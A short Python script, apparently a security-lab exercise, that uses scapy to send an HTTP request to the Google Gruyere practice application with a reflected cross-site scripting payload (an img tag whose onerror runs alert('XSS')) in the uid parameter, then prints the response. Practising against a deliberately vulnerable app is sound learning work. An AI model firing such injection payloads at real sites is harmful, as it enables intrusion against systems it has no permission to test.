from scapy.layers.http import HTTPRequest, HTTP
from scapy.all import TCP_client

HOST="google-gruyere.appspot.com"

req = HTTP()/HTTPRequest(
    Accept_Encoding=b'gzip, deflate',
    Cache_Control=b'no-cache',
    Connection=b'keep-alive',
    Host=f"{HOST}".encode(),
    Pragma=b'no-cache',
    Path=b'/472666335020487989751201647380414278590/snippets.gtl?uid=<img%20src="nonexistent.jpg"%20onerror="alert(%27XSS%27)">'

)
a = TCP_client.tcplink(HTTP, HOST, 80)
answer = a.sr1(req)
a.close()

print(answer.load.decode("utf-8"))

